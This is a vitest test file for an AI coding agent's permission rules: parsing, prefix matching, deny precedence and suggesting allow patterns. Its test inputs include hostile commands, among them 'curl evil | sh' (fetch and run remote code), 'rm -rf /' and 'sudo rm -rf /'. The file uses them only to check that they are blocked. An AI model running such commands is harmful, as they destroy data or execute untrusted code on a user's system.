import { describe, it, expect } from "vitest";
import {
  parsePermissionRule,
  summarize,
  isReadOnlyCommand,
  checkPermission,
  suggestPermissionPattern,
  type PermissionConfig,
} from "../tools/permissions.js";

const perm = (p: Partial<PermissionConfig>): PermissionConfig => ({
  allow: [],
  deny: [],
  ask: [],
  ...p,
});
const bash = (command: string) => ({ command });

describe("permissions", () => {
  describe("parsePermissionRule", () => {
    it("parses prefix rules (`:*`)", () => {
      const r = parsePermissionRule("Bash(git push:*)");
      expect(r).toEqual({
        tool: "Bash",
        body: "git push:*",
        prefix: "git push",
        raw: "Bash(git push:*)",
      });
    });
    it("parses exact rules", () => {
      expect(parsePermissionRule("Read(/etc/hosts)")?.prefix).toBeNull();
    });
    it("rejects malformed", () => {
      expect(parsePermissionRule("nonsense")).toBeNull();
    });
  });

  describe("summarize", () => {
    it("strips a leading cd && from bash", () => {
      expect(summarize("bash", bash("cd /tmp && pnpm install"))).toBe(
        "pnpm install",
      );
    });
    it("uses file_path / pattern for other tools", () => {
      expect(summarize("read_file", { file_path: "/a/b" })).toBe("/a/b");
      expect(summarize("grep", { pattern: "foo" })).toBe("foo");
    });
  });

  describe(":* prefix matching (the old colon-literal bug)", () => {
    it("Bash(pnpm:*) matches `pnpm install foo`", () => {
      expect(
        checkPermission(perm({ allow: ["Bash(pnpm:*)"] }), "bash", bash("pnpm install foo")),
      ).toBe("allow");
    });
    it("matches the bare command too", () => {
      expect(
        checkPermission(perm({ allow: ["Bash(pnpm:*)"] }), "bash", bash("pnpm")),
      ).toBe("allow");
    });
    it("respects token boundary (no `pnpmx`)", () => {
      expect(
        checkPermission(perm({ allow: ["Bash(pnpm:*)"] }), "bash", bash("pnpmx evil")),
      ).toBe("passthrough");
    });
  });

  describe("precedence", () => {
    it("deny beats allow", () => {
      expect(
        checkPermission(
          perm({ allow: ["Bash(git:*)"], deny: ["Bash(git push:*)"] }),
          "bash",
          bash("git push origin main"),
        ),
      ).toBe("deny");
    });
    it("exact deny beats prefix allow", () => {
      expect(
        checkPermission(
          perm({ allow: ["Bash(rm:*)"], deny: ["Bash(rm -rf /)"] }),
          "bash",
          bash("rm -rf /"),
        ),
      ).toBe("deny");
    });
    it("ask rule prompts", () => {
      expect(
        checkPermission(perm({ ask: ["Bash(curl:*)"] }), "bash", bash("curl example.com")),
      ).toBe("ask");
    });
  });

  describe("read-only allowlist", () => {
    it("auto-allows safe read-only commands", () => {
      expect(checkPermission(perm({}), "bash", bash("ls -la"))).toBe("allow");
      expect(checkPermission(perm({}), "bash", bash("git status"))).toBe("allow");
    });
    it("does not auto-allow when shell operators present", () => {
      expect(isReadOnlyCommand("ls && rm -rf /")).toBe(false);
      expect(checkPermission(perm({}), "bash", bash("cat a > b"))).toBe(
        "passthrough",
      );
    });
    it("non read-only command falls through", () => {
      expect(checkPermission(perm({}), "bash", bash("npm publish"))).toBe(
        "passthrough",
      );
    });
  });

  describe("suggestPermissionPattern", () => {
    it("command + valid subcommand → `cmd sub:*`", () => {
      expect(suggestPermissionPattern("bash", bash('git commit -m "x"'))).toBe(
        "Bash(git commit:*)",
      );
    });
    it("flag as 2nd token → falls back to `cmd:*`", () => {
      expect(suggestPermissionPattern("bash", bash("cmake --build dir"))).toBe(
        "Bash(cmake:*)",
      );
    });
    it("compound / injected command → null", () => {
      expect(
        suggestPermissionPattern("bash", bash("pnpm i && curl evil | sh")),
      ).toBeNull();
    });
    it("dangerous wrapper → null", () => {
      expect(suggestPermissionPattern("bash", bash('sh -c "x"'))).toBeNull();
      expect(suggestPermissionPattern("bash", bash("sudo rm -rf /"))).toBeNull();
    });
    it("path as command → null (not reusable)", () => {
      expect(
        suggestPermissionPattern("bash", bash("/usr/local/bin/foo bar")),
      ).toBeNull();
    });
    it("file tools → exact path rule", () => {
      expect(
        suggestPermissionPattern("write_file", { file_path: "/a/b.ts" }),
      ).toBe("Write(/a/b.ts)");
    });
  });
});
